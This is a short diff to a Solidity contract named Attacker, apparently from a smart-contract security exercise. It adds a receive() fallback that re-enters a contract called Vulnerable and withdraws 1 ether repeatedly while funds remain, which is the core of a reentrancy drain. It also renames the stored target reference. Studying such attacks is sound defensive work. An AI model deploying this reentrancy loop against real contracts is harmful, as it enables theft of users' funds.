@@ -8,7 +8,14 @@ contract Attacker {
     address public owner;
 
     constructor(address _vulnerableAddress) {
-        vulnerable = Vulnerable(_vulnerableAddress);
+        vul = Vulnerable(_vulnerableAddress);
         owner = msg.sender;
+    }
+
+    // Fallback function that gets triggered during reentrancy
+    receive() external payable {
+        if(address(vul).balance >= 1 ether) {
+            vul.withdraw(1 ether);
+        }
     }
 }
